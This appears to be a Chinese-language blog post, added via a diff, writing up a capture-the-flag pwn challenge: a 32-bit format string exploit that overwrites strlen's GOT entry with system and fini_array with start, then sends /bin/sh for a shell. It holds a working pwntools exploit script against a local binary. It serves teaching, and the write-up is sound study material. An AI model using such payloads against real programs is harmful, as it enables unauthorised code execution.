@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>32位格式化字符串之改写fini使程序反复 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="参考博客:https:&#x2F;&#x2F;charonpt.github.io&#x2F;2021&#x2F;11&#x2F;26&#x2F;fini_array%E5%8A%AB%E6%8C%81&#x2F; 查看程序保护pie没有开，可以直接在ida里面查找函数的got表地址。 运行一下程序存在格式化字符串漏洞，只有一个输入一个输出。格式化字符串参数的偏移为12。  ida一下下发现了system函数main函数中存在格式化字符串漏洞，sprintf函数把数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="32位格式化字符串之改写fini使程序反复">
+<meta property="og:url" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="参考博客:https:&#x2F;&#x2F;charonpt.github.io&#x2F;2021&#x2F;11&#x2F;26&#x2F;fini_array%E5%8A%AB%E6%8C%81&#x2F; 查看程序保护pie没有开，可以直接在ida里面查找函数的got表地址。 运行一下程序存在格式化字符串漏洞，只有一个输入一个输出。格式化字符串参数的偏移为12。  ida一下下发现了system函数main函数中存在格式化字符串漏洞，sprintf函数把数">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601210038.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/K3A4%7B~A58UHIKS7%7DAAZJN_T.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601215124.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601215852.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601220407.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602162652.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602170950.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602172103.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602170601.png">
+<meta property="article:published_time" content="2023-06-01T12:58:50.000Z">
+<meta property="article:modified_time" content="2023-06-02T09:24:58.184Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601210038.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://dinkjun.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-32位格式化字符串之改写fini使程序反复" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" class="article-date">
+  <time datetime="2023-06-01T12:58:50.000Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      32位格式化字符串之改写fini使程序反复
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参考博客:<a target="_blank" rel="noopener" href="https://charonpt.github.io/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/">https://charonpt.github.io/2021/11/26/fini_array%E5%8A%AB%E6%8C%81/</a></p>
+<h2 id="查看程序保护"><a href="#查看程序保护" class="headerlink" title="查看程序保护"></a>查看程序保护</h2><p>pie没有开，可以直接在ida里面查找函数的got表地址。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601210038.png" alt="Alt text"></p>
+<h2 id="运行一下程序"><a href="#运行一下程序" class="headerlink" title="运行一下程序"></a>运行一下程序</h2><p>存在格式化字符串漏洞，只有一个输入一个输出。<br>格式化字符串参数的偏移为12。</p>
+<ul>
+<li><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/K3A4%7B~A58UHIKS7%7DAAZJN_T.png" alt="Alt text"><h2 id="ida一下下"><a href="#ida一下下" class="headerlink" title="ida一下下"></a>ida一下下</h2>发现了system函数<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601215124.png" alt="Alt text"><br>main函数中存在格式化字符串漏洞，<br>sprintf函数把数组V5中的数据和Nice to meet you, 拼接在一起然后存放在s数组中。<br>最后返回printf函数把数组s的数据输出到屏幕上。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601215852.png" alt="Alt text"><br>找到了fini_array函数<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230601220407.png" alt="Alt text"></li>
+</ul>
+<p><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602162652.png" alt="Alt text"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>把由修改的字节数从小到大的顺序:先把strlen函数got表地址修改成程序里的system函数的地址，再把finit_arry函数的地址修改为start函数的地址使程序反复执行(为了能够输入system函数的参数:/bin/sh)</p>
+<p>最后在程序再一次执行到输入的时候在发送/bin/sh从而获得shell。   </p>
+<h2 id="查找strlen函数got表地址"><a href="#查找strlen函数got表地址" class="headerlink" title="查找strlen函数got表地址"></a>查找strlen函数got表地址</h2><p>注意，查找的不是strlen函数的地址，而是strlen函数got表的地址<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602170950.png" alt="Alt text"><br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602172103.png" alt="Alt text"></p>
+<h2 id="在脚本中插入gdb运行一下"><a href="#在脚本中插入gdb运行一下" class="headerlink" title="在脚本中插入gdb运行一下"></a>在脚本中插入gdb运行一下</h2><p>从而找到函数地址的偏移及是否栈对齐。<br>可以看到地址分别在格式化字符串的第21、22、23个参数里。<br><img src="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/QQ%E6%88%AA%E5%9B%BE20230602170601.png" alt="Alt text"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x80484F0</span></span><br><span class="line">finit_addr = <span class="number">0x8049934</span></span><br><span class="line">system_addr = <span class="number">0x8048490</span></span><br><span class="line">strlen_got = <span class="number">0x8049A54</span></span><br><span class="line">payload = b<span class="string">&quot;AA&quot;</span> + b<span class="string">&quot;%2032c%21$hn&quot;</span> + b<span class="string">&quot;%31884c%22$hn&quot;</span> + b<span class="string">&quot;%96c%23$hn&quot;</span> + b<span class="string">&quot;A&quot;</span> + <span class="title function_">p32</span>(strlen_got+<span class="number">2</span>) + <span class="title function_">p32</span>(strlen_got) + <span class="title function_">p32</span>(finit_addr)</span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b *0x804864F&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;your name...&quot;</span>,payload)</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;your name...&quot;</span>,b<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol>
+<li>写这道题的脚本过程中，不知道为什么，我要是使用io.recvuntil()<br>io.send(payload)这样的接收发送形式的话，我就不能够在脚本运行的时候进行gdb。<br>而换成io.sendlineafter(b””,payload)才能够在脚本运行的时候进行gdb。</li>
+<li>要注意，查找的不是strlen函数的地址，而是strlen函数got表的地址</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" data-id="clied285m0001ygv957dp7dwn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">32位格式化字符串之更改got表</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/">32位格式化字符串之改写fini使程序反复</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/">32位格式化字符串之更改got表</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/">32位格式化字符串-任意地址写就行2</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/">32位格式化字符串-任意地址写就行</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
